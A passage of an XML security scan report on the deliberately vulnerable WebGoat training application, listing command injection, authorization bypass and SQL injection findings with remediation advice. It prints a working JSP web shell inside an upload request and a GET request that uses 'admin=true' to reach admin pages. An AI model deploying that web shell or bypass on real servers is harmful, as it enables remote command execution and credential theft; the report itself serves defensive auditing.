        boundary=---------------------------41184676334\nContent-Length: 1160\n\n-----------------------------41184676334\nContent-Disposition:
        form-data; name=\"myfile\"; filename=\"cmd.jsp\"\nContent-Type: application/octet-stream\n\n&lt;%@
        page import=\"java.util.*,java.io.*\"%&gt;\n&lt;HTML&gt;&lt;BODY&gt;\n&lt;FORM
        METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"&gt;\n&lt;INPUT TYPE=\"text\" NAME=\"cmd\"&gt;\n&lt;INPUT
        TYPE=\"submit\" VALUE=\"Send\"&gt;\n&lt;/FORM&gt;\n&lt;pre&gt;\n&lt;%\nif
        (request.getParameter(\"cmd\") != null) {\n        out.println(\"Command:
        \" + request.getParameter(\"cmd\") + \"&lt;BR&gt;\");\n        Process p =
        Runtime.getRuntime().exec(request.getParameter(\"cmd\"));\n        OutputStream
        os = p.getOutputStream();\n        InputStream in = p.getInputStream();\n
        \       DataInputStream dis = new DataInputStream(in);\n        String disr
        = dis.readLine();\n        while ( disr != null ) {\n                out.println(disr);
        \n                disr = dis.readLine(); \n                }\n        }\n%&gt;\n&lt;/pre&gt;\n&lt;/BODY&gt;&lt;/HTML&gt;\n-----------------------------41184676334\nContent-Disposition:
        form-data; name=\"SUBMIT\"\n\nStart Upload\n-----------------------------41184676334--\n</code></appendix></flaw></manualflaws></cwe></category><category
        categoryid=\"18\" categoryname=\"OS Command Injection\" pcirelated=\"true\"><desc><para
        text=\"OS command injection vulnerabilities occur when data enters an application
        from an untrusted source and is used to dynamically construct and execute
        a system command.  This allows an attacker to either alter the command executed
        by the application or append additional commands.  The command is typically
        executed with the privileges of the executing process and gives an attacker
        a privilege or capability that he would not otherwise have.\"/></desc><recommendations><para
        text=\"Careful handling of all untrusted data is critical in preventing OS
        command injection attacks.   Using one or more of the following techniques
        provides defense-in-depth and minimizes the likelihood of an vulnerability.\"><bulletitem
        text=\"If possible, use library calls rather than external processes to recreate
        the desired functionality.\"/><bulletitem text=\"Validate user-supplied input
        using positive filters (white lists) to ensure that it conforms to the expected
        format, using centralized data validation routines when possible. \"/><bulletitem
        text=\"Select safe API routines.  Some APIs that execute system commands take
        an array of strings as input rather than a single string, which protects against
        some forms of command injection by ensuring that a user-supplied argument
        cannot be interpreted as part of the command.\"/></para></recommendations><cwe
        cweid=\"78\" cwename=\"Improper Neutralization of Special Elements used in
        an OS Command ('OS Command Injection')\" pcirelated=\"true\"><description><text
        text=\"This call contains a command injection flaw.  The argument to the function
        is constructed using user-supplied input.  If an attacker is allowed to specify
        all or part of the command, it may be possible to execute commands on the
        server with the privileges of the executing process.  The level of exposure
        depends on the effectiveness of input validation routines, if any.\"/></description><staticflaws><flaw
        severity=\"5\" categoryname=\"Improper Neutralization of Special Elements
        used in an OS Command ('OS Command Injection')\" count=\"1\" issueid=\"132\"
        module=\"WebGoat-5.0-with-jsp.war\" type=\"java.lang.Runtime.exec\" description=\"This
        call to java.lang.Runtime.exec() contains a command injection flaw. The argument
        to the function is constructed using user-supplied input. If an attacker is
        allowed to specify all or part of the command, it may be possible to execute
        commands on the server with the privileges of the executing process. The level
        of exposure depends on the effectiveness of input validation routines, if
        any. exec() was called on the getRuntime() object, which contains tainted
        data. The tainted data originated from an earlier call to javax.servlet.ServletRequest.getParameterValues.\r\n\r\nValidate
        all user-supplied input to ensure that it conforms to the expected format,
        using centralized data validation routines when possible. When using black
        lists, be sure that the sanitizing routine performs a sufficient number of
        iterations to remove all instances of disallowed characters. Most APIs that
        execute system commands also have a &quot;safe&quot; version of the method
        that takes an array of strings as input rather than a single string, which
        protects against some forms of command injection.\r\n\r\nReferences: \r\nCWE
        (http://cwe.mitre.org/data/definitions/78.html) \r\nOWASP (http://www.owasp.org/index.php/Command_Injection)
        \r\nWASC (http://webappsec.pbworks.com/OS-Commanding)\r\n\r\n\" note=\"\"
        cweid=\"78\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"18\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ccp\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"Exec.java\" line=\"103\" sourcefilepath=\"org/owasp/webgoat/util/\"
        scope=\"org.owasp.webgoat.util.Exec\" functionprototype=\"ExecResults execOptions(java.lang.String
        \ [], java.lang.String, int, int, byte)\" functionrelativelocation=\"9\"><exploitability_adjustments><exploitability_adjustment
        score_adjustment=\"1\"><note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"5\" categoryname=\"Improper Neutralization of Special Elements
        used in an OS Command ('OS Command Injection')\" count=\"1\" issueid=\"122\"
        module=\"WebGoat-5.0-with-jsp.war\" type=\"java.lang.Runtime.exec\" description=\"This
        call to java.lang.Runtime.exec() contains a command injection flaw. The argument
        to the function is constructed using user-supplied input. If an attacker is
        allowed to specify all or part of the command, it may be possible to execute
        commands on the server with the privileges of the executing process. The level
        of exposure depends on the effectiveness of input validation routines, if
        any. exec() was called on the getRuntime() object, which contains tainted
        data. The tainted data originated from an earlier call to javax.servlet.ServletRequest.getParameterValues.\r\n\r\nValidate
        all user-supplied input to ensure that it conforms to the expected format,
        using centralized data validation routines when possible. When using black
        lists, be sure that the sanitizing routine performs a sufficient number of
        iterations to remove all instances of disallowed characters. Most APIs that
        execute system commands also have a &quot;safe&quot; version of the method
        that takes an array of strings as input rather than a single string, which
        protects against some forms of command injection.\r\n\r\nReferences: \r\nCWE
        (http://cwe.mitre.org/data/definitions/78.html) \r\nOWASP (http://www.owasp.org/index.php/Command_Injection)
        \r\nWASC (http://webappsec.pbworks.com/OS-Commanding)\r\n\r\n\" note=\"\"
        cweid=\"78\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"18\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ccp\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"Exec.java\" line=\"292\" sourcefilepath=\"org/owasp/webgoat/util/\"
        scope=\"org.owasp.webgoat.util.Exec\" functionprototype=\"ExecResults execOptions(java.lang.String,
        java.lang.String, int, int, byte)\" functionrelativelocation=\"9\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n</staticflaws>\n<dynamicflaws>\n<flaw
        severity=\"5\" categoryname=\"Improper Neutralization of Special Elements
        used in an OS Command ('OS Command Injection')\" count=\"1\" issueid=\"276\"
        module=\"dynamic_analysis\" type=\"Improper Neutralization of Special Elements
        used in an OS Command ('OS Command Injection')\" description=\"This call contains
        a command injection flaw. The argument to the function is constructed using
        user-supplied input. If an attacker is allowed to specify all or part of the
        command, it may be possible to execute commands on the server with the privileges
        of the executing process. The level of exposure depends on the effectiveness
        of input validation routines, if any.\r\n\r\nValidate all user-supplied input
        to ensure that it conforms to the expected format, using centralized data
        validation routines when possible. When using black lists, be sure that the
        sanitizing routine performs a sufficient number of iterations to remove all
        instances of disallowed characters. Most APIs the execute system commands
        also have a &quot;safe&quot; version of the method that takes an array of
        strings as input rather than a single string, which protects against some
        forms of command injection.\r\n\r\n\r\nCWE (http://cwe.mitre.org/cgi-bin/jumpmenu.cgi?id=78)
        \r\nOWASP (http://www.owasp.org/index.php/Command_Injection) \r\nWASC (http://webappsec.pbworks.com/OS-Commanding)\r\n\r\n\"
        note=\"\" cweid=\"78\" remediationeffort=\"3\" categoryid=\"18\" pcirelated=\"true\"
        date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ccp\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        url=\"http://10.0.4.89:8080/WebGoat/attack\" vuln_parameter=\"File\"/>\n</dynamicflaws>\n</cwe>\n</category>\n<category
        categoryid=\"-1\" categoryname=\"Other\" pcirelated=\"false\">\n<desc>\n<para
        text=\"These flaws do not fit into one of Veracode's existing categories.\"/>\n</desc>\n<recommendations>\n<para
        text=\"Please see individual flaw descriptions for remediation guidance.\"/>\n</recommendations>\n<cwe
        cweid=\"807\" cwename=\"Reliance on Untrusted Inputs in a Security Decision\"
        pcirelated=\"false\">\n<description>\n<text text=\"The application uses a
        protection mechanism that relies on the existence or values of an input, but
        the input can be modified by an untrusted actor in a way that bypasses the
        protection mechanism.\"/>\n</description>\n<manualflaws>\n<flaw severity=\"5\"
        categoryname=\"Reliance on Untrusted Inputs in a Security Decision\" count=\"1\"
        issueid=\"271\" module=\"manual_analysis\" type=\"\" description=\"The application
        uses a protection mechanism that relies on the existence of an input, but
        the input can be modified by an untrusted actor in a way that bypasses the
        protection mechanism. By adding the parameter 'admin' with a value of 'true'
        the administrative interface of the application is accessible to a non-administrative
        user.\" note=\"\" cweid=\"807\" remediationeffort=\"3\" exploitLevel=\"2\"
        categoryid=\"-1\" pcirelated=\"false\" date_first_occurrence=\"2012-02-29
        16:13:33 UTC\" remediation_status=\"New\" cia_impact=\"\" grace_period_expires=\"\"
        affects_policy_compliance=\"false\" location=\"http://targethost/WebGoat/attack\"
        cvss=\"9\" capecid=\"4\" exploitdifficulty=\"1\" inputvector=\"admin\">\n<exploit_desc>An
        attacker can set this parameter easily within their web-browser. Links to
        the administrative interface will then be displayed. </exploit_desc>\n<severity_desc>Attackers
        can bypass the security decision to access whatever is being protected. The
        consequences will depend on the associated functionality, but they can range
        from granting additional privileges to untrusted users to bypassing important
        security checks. Ultimately, this weakness may lead to exposure or modification
        of sensitive data, system crash, or execution of arbitrary code.</severity_desc>\n<remediation_desc>Identify
        all inputs that are used for security decisions and determine if you can modify
        the design so that you do not have to rely on submitted inputs at all. For
        example, you may be able to keep critical information about the user's session
        on the server side instead of recording it within external data.</remediation_desc>\n<appendix>\n<description>undefined</description>\n<screenshot
        format=\"PNG\">\n<data></data>\n</screenshot>\n<code>The
        following GET request will display the username and password for users within
        the application.\n\nGET /WebGoat/attack?Screen=1073550134&amp;menu=2000&amp;admin=true
        HTTP/1.1\nHost: targethost\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64;
        rv:9.0.1) Gecko/20100101 Firefox/9.0.1\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language:
        en-us,en;q=0.5\nAccept-Encoding: gzip, deflate\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\nProxy-Connection:
        keep-alive\nCookie: JSESSIONID=13984BA559044E0A4610D4AC31B06B27\n</code></appendix></flaw></manualflaws></cwe></category></severity><severity
        level=\"4\"><category categoryid=\"19\" categoryname=\"SQL Injection\" pcirelated=\"true\"><desc><para
        text=\"SQL injection vulnerabilities occur when data enters an application
        from an untrusted source and is used to dynamically construct a SQL query.
        \ This allows an attacker to manipulate database queries in order to access,
        modify, or delete arbitrary data.  Depending on the platform, database type,
        and configuration, it may also be possible to execute administrative operations
        on the database, access the filesystem, or execute arbitrary system commands.
        \ SQL injection attacks can also be used to subvert authentication and authorization
        schemes, which would enable an attacker to gain privileged access to restricted
        portions of the application.\"/></desc><recommendations><para text=\"Several
        techniques can be used to prevent SQL injection attacks. These techniques
        complement each other and address security at different points in the application.
        Using multiple techniques provides defense-in-depth and minimizes the likelihood
        of a SQL injection vulnerability.\"><bulletitem text=\"Use parameterized prepared
        statements rather than dynamically constructing SQL queries.  This will prevent
        the database from interpreting the contents of bind variables as part of the
        query and is the most effective defense against SQL injection.\"/><bulletitem
        text=\"Validate user-supplied input using positive filters (white lists) to
        ensure that it conforms to the expected format, using centralized data validation
        routines when possible. \"/><bulletitem text=\"Normalize all user-supplied
        data before applying filters or regular expressions, or submitting the data
        to a database. This means that all URL-encoded (%xx), HTML-encoded (&amp;#xx;),
        or other encoding schemes should be reduced to the internal character representation
        expected by the application. This prevents attackers from using alternate
        encoding schemes to bypass filters.\"/><bulletitem text=\"When using database
        abstraction libraries such as Hibernate, do not assume that all methods exposed
        by the API will automatically prevent SQL injection attacks.  Most libraries
        contain methods that pass arbitrary queries to the database in an unsafe manner.\"/></para></recommendations><cwe
        cweid=\"89\" cwename=\"Improper Neutralization of Special Elements used in
        an SQL Command ('SQL Injection')\" pcirelated=\"true\"><description><text
        text=\"This database query contains a SQL injection flaw.  The function call
        constructs a dynamic SQL query using a variable derived from user-supplied
        input.  An attacker could exploit this flaw to execute arbitrary SQL queries
        against the database.\"/></description><staticflaws><flaw severity=\"4\" categoryname=\"Improper
        Neutralization of Special Elements used in an SQL Command ('SQL Injection')\"
        count=\"1\" issueid=\"126\" module=\"WebGoat-5.0-with-jsp.war\" type=\"java.sql.Statement.executeUpdate\"
        description=\"This database query contains a SQL injection flaw. The call
        to java.sql.Statement.executeUpdate() constructs a dynamic SQL query using
        a variable derived from user-supplied input. An attacker could exploit this
        flaw to execute arbitrary SQL queries against the database. The first argument
        to executeUpdate() contains tainted data from the variable arrSQL. The tainted
        data originated from an earlier call to javax.servlet.ServletRequest.getParameterValues.\r\n\r\nAvoid
        dynamically constructing SQL queries. Instead, use parameterized prepared
        statements to prevent the database from interpreting the contents of bind
        variables as part of the query. Always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/89.html)
        \r\nOWASP (http://www.owasp.org/index.php/SQL_injection) \r\nWASC (http://webappsec.pbworks.com/SQL-Injection)\r\n\r\n\"
        note=\"\" cweid=\"89\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"19\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppp\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"BackDoors.java\" line=\"106\" sourcefilepath=\"org/owasp/webgoat/lessons/\"
        scope=\"org.owasp.webgoat.lessons.BackDoors\" functionprototype=\"apache.ecs.Element
        concept1(session.WebSession)\" functionrelativelocation=\"26\"><exploitability_adjustments><exploitability_adjustment
        score_adjustment=\"1\"><note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"4\" categoryname=\"Improper Neutralization of Special Elements
        used in an SQL Command ('SQL Injection')\" count=\"1\" issueid=\"91\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"java.sql.Statement.executeQuery\" description=\"This database query
        contains a SQL injection flaw. The call to java.sql.Statement.executeQuery()
        constructs a dynamic SQL query using a variable derived from user-supplied
        input. An attacker could exploit this flaw to execute arbitrary SQL queries
        against the database. The first argument to executeQuery() contains tainted
        data from the variable arrSQL. The tainted data originated from an earlier
        call to javax.servlet.ServletRequest.getParameterValues.\r\n\r\nAvoid dynamically
        constructing SQL queries. Instead, use parameterized prepared statements to
        prevent the database from interpreting the contents of bind variables as part
        of the query. Always validate user-supplied input to ensure that it conforms
        to the expected format, using centralized data validation routines when possible.\r\n\r\nReferences:
        \r\nCWE (http://cwe.mitre.org/data/definitions/89.html) \r\nOWASP (http://www.owasp.org/index.php/SQL_injection)
        \r\nWASC (http://webappsec.pbworks.com/SQL-Injection)\r\n\r\n\" note=\"\"
        cweid=\"89\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"19\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppp\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"BackDoors.java\" line=\"113\" sourcefilepath=\"org/owasp/webgoat/lessons/\"
        scope=\"org.owasp.webgoat.lessons.BackDoors\" functionprototype=\"apache.ecs.Element
        concept1(session.WebSession)\" functionrelativelocation=\"35\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"4\" categoryname=\"Improper Neutralization of Special Elements
        used in an SQL Command ('SQL Injection')\" count=\"1\" issueid=\"236\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"java.sql.Statement.executeQuery\" description=\"This database query
        contains a SQL injection flaw. The call to java.sql.Statement.executeQuery()
        constructs a dynamic SQL query using a variable derived from user-supplied
        input. An attacker could exploit this flaw to execute arbitrary SQL queries
        against the database. The first argument to executeQuery() contains tainted
        data from the variable query. The tainted data originated from an earlier
        call to javax.servlet.ServletRequest.getParameterValues.\r\n\r\nAvoid dynamically
        constructing SQL queries. Instead, use parameterized prepared statements to
        prevent the database from interpreting the contents of bind variables as part
        of the query. Always validate user-supplied input to ensure that it conforms
        to the expected format, using centralized data validation routines when possible.\r\n\r\nReferences:
        \r\nCWE (http://cwe.mitre.org/data/definitions/89.html) \r\nOWASP (http://www.owasp.org/index.php/SQL_injection)
        \r\nWASC (http://webappsec.pbworks.com/SQL-Injection)\r\n\r\n\" note=\"\"
        cweid=\"89\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"19\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppp\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"BlindSqlInjection.java\" line=\"122\" sourcefilepath=\"org/owasp/webgoat/lessons/\"
        scope=\"org.owasp.webgoat.lessons.BlindSqlInjection\" functionprototype=\"apache.ecs.Element
        createContent(session.WebSession)\" functionrelativelocation=\"64\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"4\" categoryname=\"Improper Neutralization of Special Elements
        used in an SQL Command ('SQL Injection')\" count=\"1\" issueid=\"148\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"java.sql.Statement.executeQuery\" description=\"This database query
        contains a SQL injection flaw. The call to java.sql.Statement.executeQuery()
        constructs a dynamic SQL query using a variable derived from user-supplied
        input. An attacker could exploit this flaw to execute arbitrary SQL queries
        against the database. The first argument to executeQuery() contains tainted
        data from the variable query. The tainted data originated from an earlier
        call to javax.servlet.http.HttpServletRequest.getCookies.\r\n\r\nAvoid dynamically
        constructing SQL queries. Instead, use parameterized prepared statements to
        prevent the database from interpreting the contents of bind variables as part
        of the query. Always validate user-supplied input to ensure that it conforms
        to the expected format, using centralized data validation routines when possible.\r\n\r\nReferences:
        \r\nCWE (http://cwe.mitre.org/data/definitions/89.html) \r\nOWASP (http://www.owasp.org/index.php/SQL_injection)
        \r\nWASC (http://webappsec.pbworks.com/SQL-Injection)\r\n\r\n\" note=\"\"
        cweid=\"89\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"19\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppp\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"Challenge2Screen.java\" line=\"220\" sourcefilepath=\"org/owasp/webgoat/lessons/\"
        scope=\"org.owasp.webgoat.lessons.Challenge2Screen\" functionprototype=\"apache.ecs.Element
        doStage2(session.WebSession)\" functionrelativelocation=\"31\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"4\" categoryname=\"Improper Neutralization of Special Elements
        used in an SQL Command ('SQL Injection')\" count=\"1\" issueid=\"66\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"java.sql.Statement.executeQuery\" description=\"This database query
        contains a SQL injection flaw. The call to java.sql.Statement.executeQuery()
        constructs a dynamic SQL query using a variable derived from user-supplied
        input. An attacker could exploit this flaw to execute arbitrary SQL queries
        against the database. The first argument to executeQuery() contains tainted
        data from the variable query. The tainted data originated from an earlier
        call to javax.servlet.ServletRequest.getParameterValues.\r\n\r\nAvoid dynamically
        constructing SQL queries. Instead, use parameterized prepared statements to
        prevent the database from interpreting the contents of bind variables as part
        of the query. Always validate user-supplied input to ensure that it conforms
        to the expected format, using centralized data validation routines when possible.\r\n\r\nReferences:
        \r\nCWE (http://cwe.mitre.org/data/definitions/89.html) \r\nOWASP (http://www.owasp.org/index.php/SQL_injection)
        \r\nWASC (http://webappsec.pbworks.com/SQL-Injection)\r\n\r\n\" note=\"\"
        cweid=\"89\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"19\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppp\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"DOS_Login.java\" line=\"114\" sourcefilepath=\"org/owasp/webgoat/lessons/\"
        scope=\"org.owasp.webgoat.lessons.DOS_Login\" functionprototype=\"apache.ecs.Element
        createContent(session.WebSession)\" functionrelativelocation=\"26\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"4\" categoryname=\"Improper Neutralization of Special Elements
        used in an SQL Command ('SQL Injection')\" count=\"1\" issueid=\"245\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"java.sql.Statement.executeUpdate\" description=\"This database query
        contains a SQL injection flaw. The call to java.sql.Statement.executeUpdate()
        constructs a dynamic SQL query using a variable derived from user-supplied
        input. An attacker could exploit this flaw to execute arbitrary SQL queries
        against the database. The first argument to executeUpdate() contains tainted
        data from the variable insertData1. The tainted data originated from an earlier
        call to javax.servlet.ServletRequest.getParameterValues.\r\n\r\nAvoid dynamically
        constructing SQL queries. Instead, use parameterized prepared statements to
        prevent the database from interpreting the contents of bind variables as part
        of the query. Always validate user-supplied input to ensure that it conforms
        to the expected format, using centralized data validation routines when possible.\r\n\r\nReferences:
        \r\nCWE (http://cwe.mitre.org/data/definitions/89.html) \r\nOWASP (http://www.owasp.org/index.php/SQL_injection)
        \r\nWASC (http://webappsec.pbworks.com/SQL-Injection)\r\n\r\n\" note=\"\"
        cweid=\"89\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"19\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppp\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"DOS_Login.java\" line=\"134\" sourcefilepath=\"org/owasp/webgoat/lessons/\"
        scope=\"org.owasp.webgoat.lessons.DOS_Login\" functionprototype=\"apache.ecs.Element
        createContent(session.WebSession)\" functionrelativelocation=\"47\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"4\" categoryname=\"Improper Neutralization of Special Elements
        used in an SQL Command ('SQL Injection')\" count=\"1\" issueid=\"206\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"java.sql.Statement.executeQuery\" description=\"This database query
        contains a SQL injection flaw. The call to java.sql.Statement.executeQuery()
        constructs a dynamic SQL query using a variable derived from user-supplied
        input. An attacker could exploit this flaw to execute arbitrary SQL queries
        against the database. The first argument to executeQuery() contains tainted
        data from the variable query. The tainted data originated from an earlier
        call to javax.servlet.ServletRequest.getParameterValues.\r\n\r\nAvoid dynamically
        constructing SQL queries. Instead, use parameterized prepared statements to
        prevent the database from interpreting the contents of bind variables as part
        of the query. Always validate user-supplied input to ensure that it conforms
        to the expected format, using centralized data validation routines when possible.\r\n\r\nReferences:
        \r\nCWE (http://cwe.mitre.org/data/definitions/89.html) \r\nOWASP (http://www.owasp.org/index.php/SQL_injection)
        \r\nWASC (http://webappsec.pbworks.com/SQL-Injection)\r\n\r\n\" note=\"\"
        cweid=\"89\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"19\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppp\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"Login.java\" line=\"148\" sourcefilepath=\"org/owasp/webgoat/lessons/RoleBasedAccessControl/\"
        scope=\"org.owasp.webgoat.lessons.RoleBasedAccessControl.Login\" functionprototype=\"byte
        login(session.WebSession, int, java.lang.String)\" functionrelativelocation=\"35\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"4\" categoryname=\"Improper Neutralization of Special Elements
        used in an SQL Command ('SQL Injection')\" count=\"1\" issueid=\"75\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"java.sql.Statement.executeQuery\" description=\"This database query
        contains a SQL injection flaw. The call to java.sql.Statement.executeQuery()
        constructs a dynamic SQL query using a variable derived from user-supplied
        input. An attacker could exploit this flaw to execute arbitrary SQL queries
        against the database. The first argument to executeQuery() contains tainted
        data from the variable query. The tainted data originated from an earlier
        call to javax.servlet.ServletRequest.getParameterValues.\r\n\r\nAvoid dynamically
        constructing SQL queries. Instead, use parameterized prepared statements to
        prevent the database from interpreting the contents of bind variables as part
        of the query. Always validate user-supplied input to ensure that it conforms
        to the expected format, using centralized data validation routines when possible.\r\n\r\nReferences:
        \r\nCWE (http://cwe.mitre.org/data/definitions/89.html) \r\nOWASP (http://www.owasp.org/index.php/SQL_injection)
        \r\nWASC (http://webappsec.pbworks.com/SQL-Injection)\r\n\r\n\" note=\"\"
        cweid=\"89\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"19\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppp\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"Login.java\" line=\"149\" sourcefilepath=\"org/owasp/webgoat/lessons/SQLInjection/\"
        scope=\"org.owasp.webgoat.lessons.SQLInjection.Login\" functionprototype=\"byte
        login(session.WebSession, java.lang.String, java.lang.String)\" functionrelativelocation=\"36\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"4\" categoryname=\"Improper Neutralization of Special Elements
        used in an SQL Command ('SQL Injection')\" count=\"1\" issueid=\"106\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"java.sql.Statement.executeQuery\" description=\"This database query
        contains a SQL injection flaw. The call to java.sql.Statement.executeQuery()
        constructs a dynamic SQL query using a variable derived from user-supplied
        input. An attacker could exploit this flaw to execute arbitrary SQL queries
        against the database. The first argument to executeQuery() contains tainted
        data from the variable query. The tainted data originated from an earlier
        call to javax.servlet.ServletRequest.getParameterValues.\r\n\r\nAvoid dynamically
        constructing SQL queries. Instead, use parameterized prepared statements to
        prevent the database from interpreting the contents of bind variables as part
        of the query. Always validate user-supplied input to ensure that it conforms
        to the expected format, using centralized data validation routines when possible.\r\n\r\nReferences:
        \r\nCWE (http://cwe.mitre.org/data/definitions/89.html) \r\nOWASP (http://www.owasp.org/index.php/SQL_injection)
        \r\nWASC (http://webappsec.pbworks.com/SQL-Injection)\r\n\r\n\" note=\"\"
        cweid=\"89\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"19\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppp\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"Login.java\" line=\"191\" sourcefilepath=\"org/owasp/webgoat/lessons/SQLInjection/\"
        scope=\"org.owasp.webgoat.lessons.SQLInjection.Login\" functionprototype=\"byte
        login_BACKUP(session.WebSession, java.lang.String, java.lang.String)\" functionrelativelocation=\"36\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"4\" categoryname=\"Improper Neutralization of Special Elements
        used in an SQL Command ('SQL Injection')\" count=\"1\" issueid=\"247\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"java.sql.Statement.executeQuery\" description=\"This database query
        contains a SQL injection flaw. The call to java.sql.Statement.executeQuery()
        constructs a dynamic SQL query using a variable derived from user-supplied
        input. An attacker could exploit this flaw to execute arbitrary SQL queries
        against the database. The first argument to executeQuery() contains tainted
        data from the variable query. The tainted data originated from an earlier
        call to javax.servlet.ServletRequest.getParameterValues.\r\n\r\nAvoid dynamically
        constructing SQL queries. Instead, use parameterized prepared statements to
        prevent the database from interpreting the contents of bind variables as part
        of the query. Always validate user-supplied input to ensure that it conforms
        to the expected format, using centralized data validation routines when possible.\r\n\r\nReferences:
        \r\nCWE (http://cwe.mitre.org/data/definitions/89.html) \r\nOWASP (http://www.owasp.org/index.php/SQL_injection)
        \r\nWASC (http://webappsec.pbworks.com/SQL-Injection)\r\n\r\n\" note=\"\"
        cweid=\"89\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"19\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppp\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"SqlNumericInjection.java\" line=\"130\" sourcefilepath=\"org/owasp/webgoat/lessons/\"
